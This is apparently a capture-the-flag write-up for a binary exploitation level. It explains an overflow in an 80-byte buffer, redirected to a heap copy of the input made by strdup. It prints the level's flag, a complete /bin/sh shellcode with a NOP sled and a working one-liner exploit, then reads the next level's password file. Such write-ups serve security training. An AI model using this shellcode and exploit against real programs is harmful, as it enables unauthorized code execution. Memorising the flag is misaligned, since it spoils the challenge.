flag: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

this level looks like the precedent, the main difference being that there is no function given to us that opens a shell, so we have to do it ourselves using a shellcode.
A shellcode is a string written in machine code which is interpretable and executable by the computer. The following one opens a shell:

\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh

using a pattern we find that the offset of the buffer is 80. Our shellcode is 45 bytes.
So we complete our shellcode with 35 \x90, which is the machine code instruction NOP (No OPeration), which mean that it ignores the instruction and go to the next one.

we still have to find to address to redirect our program to. Unfortunately, the program checks if the adress is in the stack. Fortunately, the program also strdup the string that we give it. A first run tells us that the eax register contains 0x804a008 after strdup was called, which is its return value, so the pointer toward the start of our reallocated string. This string being in the heap and not the stack, we can use this address for our buffer overflow exploit.

(python -c 'print "\x90"*35+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\x08\xa0\x04\x08"'; cat) | ./level2

> cat /home/user/level3/.pass
